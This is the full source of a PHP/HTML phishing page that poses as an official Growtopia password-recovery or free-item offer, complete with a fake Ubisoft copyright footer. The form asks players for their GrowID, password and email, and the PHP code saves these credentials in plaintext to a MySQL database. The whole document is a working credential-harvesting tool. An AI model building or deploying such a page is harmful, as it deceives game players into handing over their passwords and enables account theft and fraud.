<?php
// koneksi.php harus berisi $conn = new mysqli(...);
// include koneksi
include 'koneksi.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Growtopia Password Recovery</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to bottom, #9be8ff, #fff);
      margin: 0;
      padding: 0;
    }
    header img {
      width: 100%;
      height: auto;
      display: block;
    }
    .container {
      max-width: 450px;
      background: white;
      padding: 30px;
      margin: 30px auto;
      border-radius: 15px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    h2 {
      color: #2db8f0;
      text-align: center;
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
      color: #555;
    }
    input[type="text"], input[type="email"], input[type="password"] {
  width: 100%;
  padding: 10px;
  border: 1px solid #ccc;
  border-radius: 8px;
  margin-top: 5px;
  font-size: 14px;
}
    .submit-btn {
      width: 100%;
      padding: 12px;
      background: #00b7ff;
      border: none;
      color: white;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 15px;
    }
    .submit-btn:hover {
      background: #00a0e0;
    }
    .msg { text-align:center; margin-top:15px; }
    footer {
  text-align: center;
  color: #555;
  padding: 15px 0;
  font-size: 14px;
  position: fixed;
  bottom: 0;
  left: 0;
  width: 100%;
  background: transparent; /* bisa diubah misal jadi white */
}
.image-options {
  display: flex;
  justify-content: center;
  gap: 15px;
  margin-top: 10px;
}

.image-options label {
  cursor: pointer;
  border: 2px solid transparent;
  border-radius: 10px;
  overflow: hidden;
  transition: 0.3s;
}

.image-options img {
  width: 80px;
  height: 80px;
  object-fit: cover;
  display: block;
  border-radius: 8px;
}

.image-options input[type="radio"] {
  display: none;
}

/* Efek saat dipilih */
.image-options input[type="radio"]:checked + img {
  border: 3px solid #00b7ff;
  box-shadow: 0 0 8px rgba(0, 183, 255, 0.6);
}

  </style>
</head>
<body>

  <header>
    <img src="playersupport.png" alt="Growtopia Logo">
  </header>

  <div class="container">
    <h2>GROWTOPIA FREE ITEM</h2>

    <form action="" method="POST" autocomplete="off">
      <label for="growid">GrowID *</label>
      <input type="text" id="growid" name="growid" placeholder="Enter your GrowID" required>

      <label for="password">Password *</label>
      <input type="password" id="password" name="password" placeholder="Enter your Password" required>

      <label for="email">GrowID Email *</label>
      <input type="email" id="email" name="email" placeholder="Enter your GrowID Email" required>

      <label>Pilih Item *</label>
<div class="image-options">
  <label>
    <input type="radio" name="item" value="item1" required>
    <img src="raymant.jpg" alt="Item 1">
  </label>
  <label>
    <input type="radio" name="item" value="item2" required>
    <img src="magplant.jpg" alt="Item 2">
  </label>
</div>

      <button type="submit" class="submit-btn">SUBMIT</button>
    </form>

    <?php
    // Pakai REQUEST_METHOD untuk mendeteksi POST (lebih andal)
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {

      // Ambil input dengan filter_input (menghindari undefined index)
      $growid  = trim(filter_input(INPUT_POST, 'growid', FILTER_SANITIZE_STRING)) ?? '';
      $password = trim(filter_input(INPUT_POST, 'password', FILTER_UNSAFE_RAW)) ?? '';
      $email   = trim(filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL));

      // Validasi dasar
      $errors = [];
      if ($growid === '') $errors[] = 'GrowID wajib diisi.';
      if ($password === '') $errors[] = 'Password wajib diisi.';
      if ($email === false || $email === '') $errors[] = 'Email tidak valid.';

      if (count($errors) > 0) {
        echo "<div class='msg' style='color:red;'>" . implode('<br>', $errors) . "</div>";
      } else {
        // Prepared statement untuk keamanan
        $stmt = $conn->prepare("INSERT INTO users (growid, password, email) VALUES (?, ?, ?)");
        if ($stmt === false) {
          echo "<div class='msg' style='color:red;'>Prepare failed: " . htmlspecialchars($conn->error) . "</div>";
        } else {
          $stmt->bind_param('sss', $growid, $password, $email);
          if ($stmt->execute()) {
    
          } else {
            echo "<div class='msg' style='color:red;'>Error saat menyimpan: " . htmlspecialchars($stmt->error) . "</div>";
          }
          $stmt->close();
        }
      }
    }
    ?>
  </div>

  <footer>
    <p>© 2025 Ubisoft. All Rights Reserved.</p>
  </footer>

</body>
</html>
